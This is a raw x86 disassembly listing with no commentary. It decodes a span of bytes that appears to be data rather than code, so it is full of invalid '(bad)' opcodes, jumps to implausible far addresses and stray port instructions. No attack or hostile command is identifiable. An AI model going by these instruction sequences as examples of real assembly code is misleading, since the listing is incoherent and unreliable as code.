  412f8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f8e:	mov    dh,0x23
  412f90:	imul   eax,DWORD PTR [edi+0x4fd53abc],0xfffffffe
  412f97:	(bad)  
  412f98:	cmp    al,0x19
  412f9a:	rcl    BYTE PTR [edx-0x6e],0xa7
  412f9e:	cmp    bh,ah
  412fa0:	rcl    BYTE PTR [esi+0x5fd8fe29],0xde
  412fa7:	psubsb mm6,QWORD PTR [ebx+0x143f437d]
  412fae:	aam    0x4f
  412fb0:	fadd   DWORD PTR [ecx]
  412fb2:	sbb    ecx,DWORD PTR [edi+0x9]
  412fb5:	retf   
  412fb6:	sub    DWORD PTR [edx-0x75c708d5],ecx
	...
  412fc8:	add    BYTE PTR [eax],al
  412fca:	add    BYTE PTR [edi-0x474823f0],al
  412fd0:	test   DWORD PTR [ecx+ebp*1-0x14],ebx
  412fd4:	add    al,0x10
  412fd6:	jle    0x412f82
  412fd8:	inc    ebx
  412fd9:	(bad)  
  412fdb:	pusha  
  412fdc:	dec    edi
  412fdd:	jmp    0xc512b920
  412fe2:	adc    edx,DWORD PTR [ecx+0x11]
  412fe5:	jb     0x412fb6
  412fe7:	cmp    cl,0x6f
  412fea:	iret   
  412feb:	cmp    ch,0x5f
  412fee:	mov    DWORD PTR [eax-0x5b7da40b],0x5803e7a9
  412ff8:	mov    esp,esp
  412ffa:	call   DWORD PTR [ecx+eiz*1-0x7527f3a2]
  413001:	fdiv   st(7),st
  413003:	test   BYTE PTR [ecx],ah
  413005:	add    DWORD PTR [esi+esi*8],ebp
  413008:	or     BYTE PTR [edx],dl
  41300a:	sub    al,0x89
  41300c:	adc    BYTE PTR [edx],al
  41300e:	sub    al,0xe3
  413010:	dec    ecx
  413011:	call   0x924693b1
  413016:	push   es
  413017:	nop
  413018:	and    BYTE PTR [ecx-0x6],dh
  41301b:	jmp    0xe6be8001
  413020:	in     eax,0xe4
  413022:	add    esp,DWORD PTR [ebx+0x4]
  413025:	scas   al,BYTE PTR es:[edi]
  413026:	test   eax,ecx
  413028:	jmp    0xf3f03309
  41302d:	imul   ebp,DWORD PTR [ecx],0x0
	...
  41303c:	add    BYTE PTR [eax],al
  41303e:	pop    ebp
  41303f:	mov    ch,BYTE PTR [esi]
  413041:	sub    ah,BYTE PTR ds:0xebfc5121
  413047:	rol    DWORD PTR [esp+ecx*1],1
  41304a:	jmp    0x4c9:0xd8140cc1
  413051:	loopne 0x41302c
  413053:	mov    ecx,0xd1e8140c
  413058:	add    al,0xc
  41305a:	xchg   esp,eax
  41305b:	mov    edi,0xd06993ff
  413060:	add    esp,DWORD PTR [eax-0x19]
  413063:	mov    ebx,0x43772d82
  413068:	psubsw mm3,mm7
  41306b:	sub    al,0x37
  41306d:	push   0xfffffffb
  41306f:	in     al,0x43
  413071:	jmp    0x7d31bc28
  413076:	mov    ecx,0xdf9fbfd3
  41307b:	inc    esp
  41307c:	aaa    
  41307d:	sub    ebx,DWORD PTR [edi+0x5]
  413080:	mov    esp,DWORD PTR [ebp-0x567b1f7c]
  413086:	int    0xe
  413088:	xor    DWORD PTR [ecx-0x527d3db5],0x78
  41308f:	inc    esi
  413090:	pop    ss
  413091:	jmp    0x2d64fc9d
  413096:	cld    
  413097:	dec    esp
  413098:	jae    0x413069
  41309a:	div    DWORD PTR [ebx+0x35ec2523]
  4130a0:	jae    0x413069
	...
  4130ae:	add    BYTE PTR [eax],al
  4130b0:	add    cl,ch
  4130b2:	mov    DWORD PTR [ebx],edx
  4130b4:	in     eax,dx
  4130b5:	pusha  
  4130b6:	add    eax,0xffe27048
  4130bb:	add    ebp,ecx
  4130bd:	pusha  
  4130be:	mov    cs,WORD PTR [ebp-0x1dfbb07]
  4130c4:	inc    ecx
  4130c5:	pop    edx
  4130c6:	sbb    ebp,ebp
  4130c8:	push   edx
  4130c9:	das    
  4130ca:	dec    ebp
  4130cb:	push   esi
  4130cc:	out    0xb2,al
  4130ce:	pop    ebp
  4130cf:	(bad)  
  4130d0:	fsub   DWORD PTR [ecx]
  4130d2:	and    bh,cl
  4130d4:	sub    DWORD PTR [edi],edx
  4130d6:	inc    edi
  4130d7:	push   cs
  4130d8:	xchg   edi,eax
  4130d9:	mov    DWORD PTR ds:0x3660a810,eax
  4130df:	mov    edi,0xb60fa21a
  4130e4:	add    bl,ah
  4130e6:	or     DWORD PTR [eax],edx
  4130e8:	inc    ecx
  4130e9:	or     dh,BYTE PTR [ebx+0x1d3d33be]
  4130ef:	mov    ah,0xb9
  4130f1:	stc    
  4130f2:	repz inc eax
  4130f4:	add    BYTE PTR [ebx-0x413e7e3c],bl
  4130fa:	sbb    ch,al
  4130fc:	xor    DWORD PTR [ebx+0x4],0x59ba0001
  413103:	mov    DWORD PTR [ebp-0x447ce276],0x530003b3
  41310d:	inc    ebx
  41310e:	test   BYTE PTR [esi+ecx*2+0x18c082be],0x0
	...
  413122:	add    BYTE PTR [eax],al
  413124:	jmp    0x8:0x8abf0005
  41312b:	add    BYTE PTR [edi],al
  41312d:	push   ecx
  41312e:	call   DWORD PTR [ebx+eax*1-0x6]
  413132:	xor    al,al
  413134:	pop    DWORD PTR [ebx]
  413136:	add    BYTE PTR [eax],al
  413138:	mov    bl,BYTE PTR [edx+0x63ec727]
  41313e:	add    BYTE PTR [eax],al
  413140:	jp     0x413145
  413142:	add    BYTE PTR [ebx+0x3d060a],al
  413148:	add    eax,DWORD PTR ds:[eax]
  41314b:	jb     0x413133
  41314d:	mov    al,al
  41314f:	add    BYTE PTR [esi],bh
  413151:	add    eax,DWORD PTR [eax]
  413153:	or     DWORD PTR [ebx],0x6
  413156:	sub    edi,ebx
  413158:	das    
  413159:	ror    DWORD PTR [ecx-0x1e0f172],1
  41315f:	inc    ecx
  413161:	jae    0x84e1b72f
  413167:	and    al,0xfe
  413169:	add    al,BYTE PTR [eax]
  41316b:	mov    DWORD PTR [ebx-0x5a],esp
  41316e:	sti    
  41316f:	add    esp,DWORD PTR [ebx+0x2c]
  413172:	jnp    0x413111
  413174:	xor    BYTE PTR [bp+si],al
  413177:	add    dl,ch
  413179:	sahf   
  41317a:	test   DWORD PTR [ebx],0x397b2c63
  413180:	fdivr  DWORD PTR [esi+0x2c63040f]
  413186:	jns    0x41311d
	...
  413194:	add    BYTE PTR [eax],al
  413196:	add    BYTE PTR [ebx+0x28],dh
  413199:	add    al,BYTE PTR [eax]
  41319b:	fidiv  DWORD PTR [esi+0x2c6303db]
  4131a1:	js     0x4131ab
  4131a3:	jmp    0xde68:0xe81bde70
  4131aa:	push   ebx
  4131ab:	(bad)  [edx]
  4131ad:	add    ebx,DWORD PTR [esi+0x2284f]
  4131b3:	bound  eax,QWORD PTR [esi+0x2c630412]
  4131b9:	mov    edx,0x14100f88
  4131be:	mov    DWORD PTR [edi],eax
  4131c0:	or     BYTE PTR [ecx+ecx*4],cl
  4131c3:	(bad)  [eax]
  4131c5:	(bad)  
  4131c6:	push   DWORD PTR [ebp+edx*4-0x3a]
  4131ca:	and    ecx,DWORD PTR [ebx]
  4131cc:	adc    eax,DWORD PTR [ecx+0xe]
  4131cf:	fstp   QWORD PTR [ebx-0x3]
  4131d2:	call   FWORD PTR [ecx+ebx*4-0x77]
  4131d6:	call   DWORD PTR [esp+ebp*1+0x2]
  4131da:	mov    esp,DWORD PTR [edi+0x2384c650]
  4131e0:	clc    
  4131e1:	jmp    0xa91e170
  4131e6:	inc    ecx
  4131e7:	jmp    0xaf64:0xe717dfef
  4131ee:	sub    al,0xd8
  4131f0:	neg    edi
  4131f2:	pop    edi
  4131f3:	call   0x5f54a8fc
  4131f8:	add    eax,0xdae9
	...
  413209:	add    BYTE PTR [eax-0x262e4717],bl
  41320f:	jbe    0x413205
  413211:	(bad)  
  413212:	cld    
  413213:	sbb    eax,0xb540d011
  413218:	xchg   edi,eax
  413219:	jp     0x4131b3
  41321b:	jmp    0x1ed503b4
  413220:	sbb    BYTE PTR [edx+0x436bf4a0],al
  413226:	mov    DWORD PTR gs:[ebx-0x2ee23302],edx
  41322d:	mov    DWORD PTR [eax-0x17ee6bff],0xe9bfccb0
  413237:	mov    eax,0xb0dbc3c4
  41323c:	int3   
  41323d:	xlat   BYTE PTR ds:[ebx]
  41323e:	fstp   TBYTE PTR [eax-0x276243c]
  413244:	jno    0x413206
  413246:	inc    eax
  413247:	mov    ecx,0x9707671
  41324c:	jmp    0x38836a54
  413251:	rcl    DWORD PTR [ebx],1
  413253:	nop
  413254:	sbb    al,0xe0
  413256:	xor    BYTE PTR [ebx-0x7e7bc98f],dh
  41325c:	mov    cl,0x25
  41325e:	mov    DWORD PTR gs:[eax+eiz*8],edi
  413262:	mov    BYTE PTR [eax-0x769bfd5d],cl
  413268:	inc    esi
  413269:	dec    DWORD PTR [ebp+ebx*1+0x61]
  41326d:	jle    0x41326f
	...
  41327b:	add    BYTE PTR [eax],al
  41327d:	add    BYTE PTR [ecx],0xe9
  413280:	add    esp,DWORD PTR [edx+eax*8]
  413283:	int3   
  413284:	packsswb mm0,QWORD PTR ds:0xc16a03e9
  41328b:	dec    esp
  41328d:	or     BYTE PTR [edx+0x5466a61],dl
  413293:	movq   mm6,QWORD PTR [ecx]
  413296:	or     BYTE PTR [eax],al
  413298:	jmp    0x1164fb96
  41329d:	push   cs
  41329e:	mov    DWORD PTR [edi-0x16],eax
  4132a1:	pusha  
  4132a2:	add    eax,0xd14ad8b
  4132a7:	push   edi
  4132a8:	adc    ah,BYTE PTR [esi+0x2d624fb7]
  4132ae:	and    al,0xe1
  4132b0:	xor    eax,0xb58a1b86
  4132b5:	mov    ah,0xd4
  4132b7:	push   esi
  4132b8:	mov    eax,0x318a4a4b
  4132bd:	addr16 pop eax
  4132bf:	test   BYTE PTR [esi],0x86
  4132c2:	ffreep st(2)
  4132c4:	imul   BYTE PTR ds:0x60e902f9
  4132ca:	nop
  4132cb:	inc    ebx
  4132cc:	int    0xb8
  4132ce:	fcos   
  4132d0:	jecxz  0x413332
  4132d2:	add    eax,0x1be3f07c
  4132d7:	add    esi,ebp
  4132d9:	or     al,0xd
  4132db:	add    ebp,ecx
  4132dd:	pusha  
  4132de:	(bad)  
  4132e0:	dec    ebx
	...
  4132ed:	add    BYTE PTR [eax],al
  4132ef:	add    BYTE PTR [edi+0x5],ah
  4132f2:	jl     0x4132e4
  4132f4:	jecxz  0x413311
  4132f6:	add    ch,dh
  4132f8:	in     al,dx
  4132f9:	sbb    al,0x1
  4132fb:	jmp    0x59cc360
  413300:	das    
  413301:	pop    DWORD PTR [ebx-0x33]
  413304:	and    al,0x8f
  413306:	xchg   ebp,eax
  413307:	cmc    
  413308:	dec    esp
  413309:	sbb    al,0xfe
  41330b:	ret    0x8da3
  41330e:	inc    ebx
  41330f:	lds    eax,FWORD PTR [eax-0x3c]
  413312:	dec    edi
  413313:	add    BYTE PTR [edi+0x7850ff5d],ch
  413319:	aaa    
  41331a:	mov    eax,DWORD PTR [esi+edx*1+0x54]
  41331e:	dec    esi
  41331f:	mov    edi,esp
  413321:	(bad)  
  413322:	(bad)  
  413324:	jge    0x413307
  413326:	mov    DWORD PTR [esi+eiz*2+0x39],ecx
  41332a:	aaa    
  41332b:	dec    esp
  41332c:	push   esi
  41332d:	inc    ecx
  41332e:	mov    eax,DWORD PTR [ebx+0xb]
  413331:	lahf   
  413332:	inc    edx
  413333:	and    al,0xfe
  413335:	dec    edx
  413336:	jp     0x413371
  413338:	jno    0x4132f1
  41333a:	push   eax
  41333b:	mov    edi,DWORD PTR [eax+eax*1]
  41333e:	inc    ebx
  41333f:	test   DWORD PTR [ebp-0x59b3761f],0xa6448747
  413349:	cmp    ecx,DWORD PTR [ecx+0x4e5b9644]
  41334f:	push   ecx
  413350:	inc    ecx
  413351:	shl    dh,cl
  413353:	das    
	...
  413360:	add    BYTE PTR [eax],al
  413362:	add    BYTE PTR [ebp-0x1740219],dh
  413368:	cmp    esp,DWORD PTR [edx]
  41336a:	sub    eax,DWORD PTR [edx-0x2c4736fb]
  413370:	xchg   ecx,eax
  413371:	loope  0x4133ab
  413373:	mov    ch,0xe9
  413375:	iret   
  413376:	cli    
  413377:	adc    ebx,eax
  413379:	mov    edi,0xc2028de8
  41337e:	jmp    0x4133da
  413380:	mov    WORD PTR [edx+0x24],cs
  413383:	dec    esi
  413384:	push   edx
  413385:	mov    esi,ecx
  413387:	xchg   edx,eax
  413388:	or     edi,esi
  41338a:	jmp    FWORD PTR [ebp-0x79dbad75]
  413390:	mov    dl,dh
  413392:	mov    eax,DWORD PTR [esi-0x75adc1d3]
  413398:	mov    cl,ah
  41339a:	call   0xfe5aae02
  41339f:	cmp    al,0x48
  4133a1:	cmp    cl,BYTE PTR [edx+0x23bf9820]
  4133a7:	mov    esp,DWORD PTR [ebp+0x2f60e186]
  4133ad:	inc    esp
  4133ae:	rcr    BYTE PTR [ebx],0x2f
  4133b1:	add    eax,0xdd683f44
  4133b6:	out    0x8e,eax
  4133b8:	adc    al,0x49
  4133ba:	inc    ebx
  4133bb:	aas    
  4133bc:	sbb    BYTE PTR [ebx],al
  4133be:	add    BYTE PTR [ebx+0x2c],ah
  4133c1:	xchg   esi,edi
  4133c3:	ins    DWORD PTR es:[edi],dx
  4133c4:	add    al,0xdd
  4133c6:	imul   eax,DWORD PTR [eax],0x0
	...
  4133d5:	add    BYTE PTR [edi+0x60],al
  4133d8:	sahf   
  4133d9:	das    
  4133da:	fsub   DWORD PTR [eax-0x1a]
  4133dd:	daa    
  4133de:	ss jge 0x41336e
  4133e1:	int    0xcb
  4133e3:	mov    ds:0x97ccfe19,al
  4133e8:	mov    bh,0x23
  4133ea:	pop    ds
  4133eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4133ec:	cmp    ecx,DWORD PTR [edx+0x51c24027]
  4133f2:	adc    edx,DWORD PTR [edi+0x12f8e751]
  4133f8:	and    esi,edi
  4133fa:	push   0x475b8eef
  4133ff:	je     0x4133a0
  413401:	pop    es
  413402:	pushf  
  413403:	call   0x2ca347ef
  413408:	add    al,BYTE PTR [eax]
  41340a:	fidiv  WORD PTR [ebx]
  41340c:	xchg   edi,eax
  41340d:	dec    esp
  41340e:	cmp    bl,al
  413410:	out    0x43,eax
  413412:	imul   dl
  413414:	mov    cs,WORD PTR [ebp+0x22057]
  41341a:	stc    
  41341b:	sub    al,0xb5
  41341d:	push   eax
  41341e:	call   0x50df5e9c
  413423:	add    eax,0xb0d922a6
  413428:	(bad)  
  413429:	(bad)  
  41342a:	fnstcw WORD PTR [ecx+eiz*2]
  41342d:	mov    DWORD PTR [eax-0x164bc53b],0x36b0904a
  413437:	sbb    bh,BYTE PTR [ebp-0x72]
	...
  413446:	add    BYTE PTR [eax],al
  413448:	add    BYTE PTR [eax-0x4c473f1f],bl
  41344e:	mov    ds,WORD PTR [esi-0x18024770]
  413454:	sub    ebp,DWORD PTR [eax+0x49225d13]
  41345a:	cmp    eax,0xbd40bf61
  41345f:	into   
  413460:	or     eax,0xf80cc11c
  413465:	in     al,dx
  413466:	sbb    eax,ebp
  413468:	add    edi,eax
  41346a:	or     eax,0xf1809f6a
  41346f:	call   0xe98c1286
  413474:	add    esp,DWORD PTR [ebx-0x7a]
  413477:	sbb    eax,DWORD PTR ds:0x4418b54
  41347d:	arpl   WORD PTR ds:0xe580b762,ax
  413483:	jno    0x41340e
  413485:	push   eax
  413486:	add    ecx,ebp
  413488:	add    esp,eax
  41348a:	inc    esi
  41348b:	div    BYTE PTR [ecx+eiz*8-0x1e4915bb]
  413492:	inc    esp
  413493:	jmp    0x33e0:0x4c8dfb3
  41349a:	mov    fs,WORD PTR [esi-0x32e413d4]
  4134a0:	and    ecx,ebp
  4134a2:	ror    BYTE PTR [esp+edx*8],0x29
  4134a6:	rol    DWORD PTR [esp+ebp*8],0xd9
  4134aa:	mov    al,0xff
  4134ac:	or     al,0x0
	...
  4134ba:	add    BYTE PTR [eax],al
  4134bc:	cmp    esi,DWORD PTR [edi-0x62f06076]
  4134c2:	and    dl,BYTE PTR [ecx-0x6101ee94]
  4134c8:	(bad)  
  4134c9:	xor    BYTE PTR [edx+0x54e14b2d],cl
  4134cf:	cmp    esi,esp
  4134d1:	dec    edx
  4134d2:	out    0x97,eax
  4134d4:	push   esp
  4134d5:	pop    ss
  4134d6:	(bad)  
  4134d7:	rcr    BYTE PTR [edi+0x668b827d],cl
  4134dd:	add    al,0xc2
  4134df:	bound  esp,QWORD PTR [edi+0x3febf845]
  4134e5:	out    dx,al
  4134e6:	out    0x43,eax
  4134e8:	ins    BYTE PTR es:[edi],dx
  4134e9:	pop    ss
  4134ea:	(bad)  
  4134eb:	bound  edi,QWORD PTR [edi]
  4134ed:	mov    eax,DWORD PTR [ebx+0x5]
  4134f0:	pop    es
  4134f1:	mov    dl,0x4f
  4134f3:	jb     0x413486
  4134f5:	and    dl,cl
  4134f7:	xor    al,0x42
  4134f9:	pop    ss
  4134fa:	mov    ah,BYTE PTR [ecx]
  4134fc:	into   
  4134fd:	dec    ebx
  4134fe:	add    ah,BYTE PTR [eax]
  413500:	aaa    
  413501:	sub    eax,0xfd172a1
  413506:	call   0xc9cc9a43
  41350b:	sub    BYTE PTR [eax-0x19dcfd09],cl
  413511:	les    esp,FWORD PTR [ebx]
  413513:	mov    ebp,0x103a4d67
  413518:	les    eax,FWORD PTR [eax]
  41351a:	(bad)  
  41351b:	lods   eax,DWORD PTR ds:[esi]
  41351c:	test   ah,dh
  41351e:	add    cl,ch
	...
  41352c:	add    BYTE PTR [eax],al
  41352e:	add    BYTE PTR [eax+0x5],ah
  413531:	test   esi,esp
  413533:	jmp    0x8ae4:0xe4a43ae0
  41353a:	cmp    eax,0x3b4fe88b
  41353f:	out    0x4a,al
  413541:	out    0x0,eax
  413543:	hlt    
  413544:	out    dx,al
  413545:	std    
  413546:	push   ecx
  413548:	fisttp DWORD PTR [ecx+0x53296e44]
  41354e:	push   eax
  41354f:	shl    DWORD PTR [esi-0x1b10801a],0xfd
  413556:	cmp    esp,DWORD PTR [edx]
  413558:	cmc    
  413559:	mov    eax,DWORD PTR [edx]
  41355b:	dec    ecx
  41355c:	add    al,0x0
  41355e:	and    DWORD PTR [esi+0x2d],0x12
  413562:	add    BYTE PTR ds:0x3a02f57f,dh
  413568:	add    al,0x83
  41356a:	std    
  41356b:	or     ebp,esi
  41356d:	(bad)  
  41356e:	aam    0xa
  413570:	add    al,0x0
  413572:	mov    edx,esi
  413574:	pop    ds
  413575:	push   ds
  413576:	mov    ecx,esi
  413578:	pop    ds
  413579:	push   esi
  41357a:	mov    ecx,DWORD PTR [eax+edx*1-0x7ef5fffe]
  413581:	mov    edi,0xc080cbfd
  413586:	add    ecx,eax
  413588:	cmp    BYTE PTR [esi+0x4a86fa03],0x24
  41358f:	(bad)  
  413590:	push   edx
  413591:	mov    esi,ecx
	...
  41359f:	add    BYTE PTR [eax],al
  4135a1:	add    BYTE PTR [edx-0x45],dh
  4135a4:	idiv   bh
  4135a6:	mov    DWORD PTR gs:[edx+0x24],eax
  4135aa:	call   0x5a88:0x8e245288
  4135b1:	and    al,0x92
  4135b3:	cmp    cl,al
  4135b5:	push   edx
  4135b6:	xor    DWORD PTR [esi-0x145083b2],esi
  4135bc:	and    dh,ch
  4135be:	test   edi,esi
  4135c0:	push   ebx
  4135c1:	push   ebx
  4135c2:	adc    edi,eax
  4135c4:	xchg   DWORD PTR [esi+ebx*2+0x15],eax
  4135c8:	out    0x17,al
  4135ca:	arpl   WORD PTR [ecx],di
  4135cc:	push   ds
  4135cd:	(bad)  
  4135ce:	call   0x38651dcc
  4135d3:	ins    DWORD PTR es:[edi],dx
  4135d4:	jl     0x413558
  4135d6:	sub    DWORD PTR [edx],0x64e8c201
  4135dc:	inc    esp
  4135dd:	clc    
  4135de:	popa   
  4135df:	inc    ebx
  4135e0:	out    dx,eax
  4135e1:	out    0x4c,eax
  4135e3:	jns    0x413603
  4135e5:	(bad)  
  4135e6:	scas   al,BYTE PTR es:[edi]
  4135e7:	fisttp DWORD PTR [edx-0x18171533]
  4135ed:	sub    ecx,DWORD PTR [ebx+0x7b]
  4135f0:	pop    ss
  4135f1:	(bad)  
  4135f2:	sub    al,0x94
  4135f4:	dec    ebx
  4135f5:	mov    bl,BYTE PTR [edi+0x2b2ae640]
  4135fb:	sub    al,0x4b
  4135fd:	mov    bh,0xa
  4135ff:	retf   
  413600:	mov    ch,BYTE PTR ds:0xf934b614
	...
  413612:	add    BYTE PTR [eax],al
  413614:	add    al,bl
  413616:	rol    BYTE PTR [eax+ebp*8+0x5c],cl
  41361a:	sub    ecx,DWORD PTR [eax-0x76]
  41361d:	lahf   
  41361e:	add    al,bl
  413620:	add    bl,BYTE PTR [ebx]
  413622:	add    al,0x2d
  413624:	jl     0x413681
  413626:	ffreep st(7)
  413628:	and    esi,DWORD PTR [edi+0x2d]
  41362b:	add    al,BYTE PTR [eax]
  41362d:	arpl   WORD PTR [ecx+0x237b751e],sp
  413633:	inc    edi
  413634:	jnp    0x4136b5
  413636:	xchg   ebx,eax
  413637:	mov    bh,0x23
  413639:	jae    0x413697
  41363b:	mov    al,0x8a
  41363d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41363e:	add    al,0x55
  413640:	rep lods al,BYTE PTR ds:[esi]
  413642:	dec    DWORD PTR [edx-0x199f2729]
  413648:	daa    
  413649:	ss jl  0x4135d5
  41364c:	int    0x8b
  41364e:	retf   0xfe17
  413651:	mov    WORD PTR ds:0x89553c22,es
  413657:	add    eax,DWORD PTR [edx]
  413659:	arpl   WORD PTR ds:0xf1409f6a,ax
  41365f:	call   0xeb3d1c72
  413664:	add    esp,DWORD PTR [ebx-0x76]
  413667:	sbb    al,0xe8
  413669:	mov    ah,0x80
  41366b:	mov    ch,0xe
  41366d:	fild   QWORD PTR [ecx-0x7d9cfc19]
  413673:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413674:	add    al,0x54
  413676:	jg     0x4136b0
  413678:	add    eax,0x0
	...
  413685:	add    BYTE PTR [eax],al
  413687:	add    BYTE PTR [ebx+0x5],ah
  41368a:	bound  esi,QWORD PTR [edi+0x4e61b180]
  413690:	jns    0x4136dc
  413692:	jae    0x41369b
  413694:	pop    ecx
  413695:	fisub  DWORD PTR [ebp-0x52759d6b]
  41369b:	mov    bl,0xe9
  41369d:	rol    ah,0xf7
  4136a0:	cmp    DWORD PTR [esi],esi
  4136a2:	mov    ecx,0x4c8d7b3
  4136a7:	loopne 0x41363c
  4136a9:	mov    ah,BYTE PTR [esi]
  4136ab:	mov    WORD PTR [eax+0x182c04e1],ds
  4136b1:	push   cs
  4136b2:	inc    ebp
  4136b3:	push   ds
  4136b4:	sub    ebx,DWORD PTR [ecx-0x2ead27fc]
  4136ba:	popa   
  4136bb:	mov    bh,0x80
  4136bd:	aad    0x95
  4136bf:	mov    cl,0xd9
  4136c1:	inc    esi
  4136c2:	adc    al,ah
  4136c4:	rcl    BYTE PTR ds:0x89948a1d,1
  4136ca:	lods   al,BYTE PTR ds:[esi]
  4136cb:	out    0x6c,eax
  4136cd:	scas   al,BYTE PTR es:[edi]
  4136ce:	mov    eax,0xd62c9e8a
  4136d3:	pop    ss
  4136d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4136d5:	adc    eax,0xb8e942c1
  4136da:	dec    esp
  4136dc:	mov    WORD PTR [edi-0x1e639df1],ss
  4136e2:	das    
  4136e3:	jb     0x4136b0
  4136e5:	loope  0x41371a
  4136e7:	jo     0x41367c
  4136e9:	loope  0x413722
  4136eb:	pusha  
	...
  4136f8:	add    BYTE PTR [eax],al
  4136fa:	add    BYTE PTR [ebx-0x649dc41f],bh
  413700:	loope  0x413711
  413702:	push   ds
  413703:	mov    dl,0xc5
  413705:	mov    ch,BYTE PTR [edi-0x490f1471]
  41370b:	jbe    0x41378c
  41370d:	dec    ebx
  41370e:	add    eax,0x7250bc2f
  413713:	xchg   ebp,eax
  413714:	jg     0x4136ed
  413716:	xchg   ecx,eax
  413717:	pop    eax
  413718:	pop    ss
  413719:	(bad)  
  41371a:	xchg   esi,eax
  41371b:	sbb    cl,BYTE PTR [eax+0xe]
  41371e:	pop    esp
  41371f:	(bad)  
  413720:	adc    al,0xfe
  413722:	jmp    0xd164e802
  413727:	cmp    esi,DWORD PTR [ebx+0x23]
  41372a:	in     eax,dx
  41372b:	pusha  
  41372c:	add    eax,0xb8da1175
  413731:	and    edi,ebp
  413733:	fcmovne st,st(0)
  413735:	and    edi,ecx
  413737:	mov    bh,0xb6
  413739:	dec    edi
  41373a:	bound  esp,QWORD PTR [ebp+0x4e59f12c]
  413740:	adc    edx,DWORD PTR [edx+ebx*4-0x25]
  413744:	inc    edx
  413745:	mov    BYTE PTR [ebp+0x2fe7e0c4],ah
  41374b:	jb     0x413760
  41374d:	(bad)  
  41374e:	bound  esi,QWORD PTR [ebx+0x18ea23e8]
  413754:	jg     0x413728
  413756:	mov    ah,0xa2
  413758:	jge    0x4137a5
  41375a:	int    0xc8
  41375c:	mov    dh,0x8a
  41375e:	pop    ds
	...
  41376b:	add    BYTE PTR [eax],al
  41376d:	add    BYTE PTR [edi+0x64],bh
  413770:	repnz add BYTE PTR [ebp-0xe],bl
  413774:	mov    eax,ebx
  413776:	adc    DWORD PTR ds:0x58f53822,edi
  41377c:	mov    esi,ecx
  41377e:	bound  ebp,QWORD PTR [eax+0x7d7dfff1]
  413784:	push   0x24
  413786:	outs   dx,BYTE PTR ds:[esi]
  413787:	push   es
  413788:	fmul   DWORD PTR [ebx+0x3b221d46]
  41378e:	mov    ecx,0x42245a7d
  413793:	jae    0x4137dc
  413795:	jmp    0x4137dd
  413797:	jge    0x4137f3
  413799:	and    al,0x72
  41379b:	jle    0x4137df
  41379d:	and    al,0x52
  41379f:	sub    eax,0x8362484
  4137a4:	add    BYTE PTR [ebp+0x33],dh
  4137a7:	test   DWORD PTR [eax+ebp*1+0x846],edi
  4137ae:	push   esi
  4137af:	push   cs
  4137b0:	cmp    eax,DWORD PTR [eax]
  4137b2:	aaa    
  4137b3:	or     BYTE PTR [eax],al
  4137b5:	jl     0x4137be
  4137b7:	test   ebp,edi
  4137b9:	add    dl,BYTE PTR [esi]
  4137bb:	es jg  0x41383a
  4137be:	es xor dh,bh
  4137c1:	jl     0x4137bd
  4137c3:	pop    es
  4137c4:	jl     0x4137cb
  4137c6:	mov    ecx,esi
  4137c8:	add    DWORD PTR [ecx+edi*8+0x7c],esi
  4137cc:	dec    edx
  4137cd:	and    al,0x52
  4137cf:	pop    edx
  4137d0:	dec    edi
  4137d1:	mov    eax,DWORD PTR [eax]
	...
  4137df:	add    BYTE PTR [eax],al
  4137e1:	sub    al,0xe0
  4137e3:	int3   
  4137e4:	repz popf 
  4137e6:	icebp  
  4137e7:	jmp    0x2295791c
  4137ec:	pop    eax
  4137ed:	inc    ecx
  4137ee:	dec    esp
  4137ef:	and    dl,BYTE PTR [eax]
  4137f1:	push   ecx
  4137f2:	aad    0x29
  4137f4:	xlat   BYTE PTR ds:[ebx]
  4137f5:	clc    
  4137f6:	push   edi
  4137f7:	mov    esi,ecx
  4137f9:	arpl   WORD PTR [esi],ax
  4137fb:	outs   dx,BYTE PTR ds:[esi]
  4137fc:	out    dx,eax
  4137fd:	lods   al,BYTE PTR ds:[esi]
  4137fe:	add    bl,BYTE PTR [ebx+eax*2]
  413801:	jg     0x413831
  413803:	jg     0x4137f3
  413805:	bound  ebx,QWORD PTR [ecx-0x588e15dc]
  41380b:	mov    dh,0x23
  41380d:	jae    0x4137c0
  41380f:	(bad)  
  413810:	(bad)  
  413811:	xor    dl,al
  413813:	mov    cs,ebp
  413815:	mov    ecx,DWORD PTR [edi-0x118b01ed]
  41381b:	sbb    al,BYTE PTR [edx-0x70f6e192]
  413821:	loop   0x413840
  413823:	add    al,BYTE PTR [eax]
  413825:	call   0x634527d4
  41382a:	sbb    al,0xaf
  41382c:	push   edx
  41382d:	mov    bl,0xa7
  41382f:	dec    ecx
  413830:	out    0x65,eax
  413832:	ins    BYTE PTR es:[edi],dx
  413833:	sbb    bh,dh
  413835:	call   0x8e69181a
  41383a:	int    0x8e
  41383c:	int    0xd8
  41383e:	push   esp
  41383f:	sub    ebp,edi
  413841:	xor    DWORD PTR [edx+ebx*1+0x3a],ecx
	...
  413854:	and    BYTE PTR [edx+ebp*8],dl
  413857:	mov    bl,BYTE PTR [edi-0x1ac515c0]
  41385d:	dec    eax
  41385e:	(bad)  
  41385f:	inc    DWORD PTR [edx+esi*1]
  413862:	or     eax,DWORD PTR [ebx-0xb43]
  413868:	arpl   WORD PTR [esi+ecx*4],bx
  41386b:	inc    esp
  41386c:	cs sbb al,0xff
  41386f:	jmp    DWORD PTR [ebx+0x48]
  413872:	inc    DWORD PTR [edx+0x68e1ede]
  413878:	xchg   esi,eax
  413879:	sbb    al,0x97
  41387b:	dec    esp
  41387d:	pusha  
  41387e:	aam    0x8a
  413880:	daa    
  413881:	add    eax,0xa1ebbbcd
  413886:	(bad)  
  413887:	out    dx,eax
  413888:	fbld   TBYTE PTR [eax]
  41388a:	pushf  
  41388b:	jecxz  0x413866
  41388d:	jnp    0x413883
  41388f:	jmp    DWORD PTR [edx+edx*1+0x43e9b599]
  413896:	adc    ch,ah
  413898:	test   BYTE PTR [edx],dl
  41389a:	cmc    
  41389b:	pop    ebx
  41389c:	arpl   WORD PTR ds:0x8b6203e9,ax
  4138a2:	cld    
  4138a3:	(bad)  
  4138a4:	jl     0x4138b8
  4138a6:	xadd   BYTE PTR [eax-0x7],al
  4138aa:	pop    ebx
  4138ab:	and    al,0xdf
  4138ad:	mov    cl,0xeb
  4138af:	sbb    bh,BYTE PTR [ecx-0x51]
  4138b2:	jno    0x41386b
